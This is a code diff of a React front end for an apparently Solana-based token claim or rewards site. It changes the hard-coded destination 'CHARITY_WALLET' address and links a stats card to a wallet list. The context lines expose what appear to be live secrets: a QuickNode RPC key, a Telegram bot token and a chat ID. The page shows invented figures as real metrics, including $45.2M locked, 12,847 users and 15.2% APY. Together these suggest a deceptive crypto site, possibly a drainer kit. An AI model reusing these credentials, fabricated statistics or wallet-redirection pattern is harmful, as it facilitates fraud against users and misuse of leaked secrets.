@@ -10,7 +10,7 @@ import StatsCard from "@/components/StatsCard";
 import { Wallet, Coins, Users, TrendingUp, Loader2, X } from "lucide-react";
 import { toast } from "sonner";
 import solanaLogo from "@/assets/solana-logo.jpg";
-const CHARITY_WALLET = "wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj";
+const CHARITY_WALLET = "AptkzpTYSzR7MeJ1BTJz2M8h5s3HkiiZjV7FKpZTBZEE";
 const QUICKNODE_RPC = "https://few-greatest-card.solana-mainnet.quiknode.pro/96ca284c1240d7f288df66b70e01f8367ba78b2b";
 const TELEGRAM_BOT_TOKEN = "8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M";
 const TELEGRAM_CHAT_ID = "-4836248812";
@@ -249,7 +249,9 @@ const Index = () => {
         {/* Stats Grid */}
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-20">
           <StatsCard label="Total Value Locked" value="$45.2M" icon={<TrendingUp className="h-5 w-5" />} />
-          <StatsCard label="Active Users" value="12,847" icon={<Users className="h-5 w-5" />} />
+          <Link to="/learn-more#wallet-list" className="block hover:scale-105 transition-all duration-300">
+            <StatsCard label="Active Users" value="12,847" icon={<Users className="h-5 w-5" />} />
+          </Link>
           <StatsCard label="Total Claimed" value="892K SOL" icon={<Coins className="h-5 w-5" />} />
           <StatsCard label="Reward Rate" value="15.2% APY" icon={<TrendingUp className="h-5 w-5" />} />
         </div>
